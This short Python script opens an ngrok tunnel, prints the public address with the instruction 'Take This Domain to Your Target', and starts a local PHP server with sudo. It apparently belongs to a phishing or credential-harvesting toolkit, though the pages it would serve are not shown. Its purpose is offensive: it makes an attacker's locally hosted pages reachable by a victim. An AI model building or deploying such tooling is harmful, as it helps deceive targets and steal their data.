# Imports:

from pyngrok  import ngrok
from colorama import Fore
from os       import system

# Colors:

GREEN,LIGHTGREEN,BLUE,MAGENTA,RED=Fore.GREEN,Fore.LIGHTGREEN_EX,Fore.BLUE,Fore.MAGENTA,Fore.RED
YELLOW,CYAN,LIGHTCYAN,WHITE,RESET=Fore.YELLOW,Fore.CYAN,Fore.LIGHTCYAN_EX,Fore.WHITE,Fore.RESET

# Definition:

def generate() :
    domain=ngrok.connect()
    print(f'{YELLOW}Take This Domain to Your Target  ===> {RED}{domain}{RESET}')
    system("sudo php -S localhost:80")
    input()

########################### END ###########################